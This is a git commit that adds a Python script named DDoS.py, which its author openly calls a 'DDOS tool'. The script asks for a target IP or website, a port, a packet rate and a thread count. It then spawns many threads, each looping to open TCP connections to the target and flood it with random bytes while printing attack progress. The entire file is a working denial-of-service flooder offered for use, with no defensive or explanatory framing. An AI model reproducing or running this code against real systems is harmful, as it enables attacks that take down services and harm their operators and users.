743736dfcad06abe55e5c1e696912d79bef1218b
Canasorngit <100019956+Canasorngit@users.noreply.github.com>
2022-06-24 20:30:19 +0700

    Add files via upload

---
+++ DDoS.py
@@ -0,0 +1,38 @@
+
+import socket
+import random
+import threading
+
+print("""
+█▀▄ █▀█ █▀ ░░▄▀ █▀▄ █▀▄ █▀█ █▀
+█▄▀ █▄█ ▄█ ▄▀░░ █▄▀ █▄▀ █▄█ ▄█
+""")
+
+print("by Moonbitzyt/Canasorngit")
+print("DDOS tool")
+
+print("---------------------------------------------------------")
+ip = str(input('[+] Target IP/Website: '))
+port = int(input('[+] Target PORT: '))
+pack = int(input('[+] Packet/seconds [Max is 5000]: '))
+thread = int(input('[+] Threads [can be [800]: '))
+
+
+def start():
+    hh = random._urandom(10)
+    xx = int(0)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(hh)
+            for i in range(pack):
+                s.send(hh)
+            xx += 1
+            print('MoonNetwork Attacking: '+ip+' | Sent: '+str(xx))
+        except:
+            s.close()
+
+for x in range(thread):
+    thred = threading.Thread(target=start)
+    thred.start()
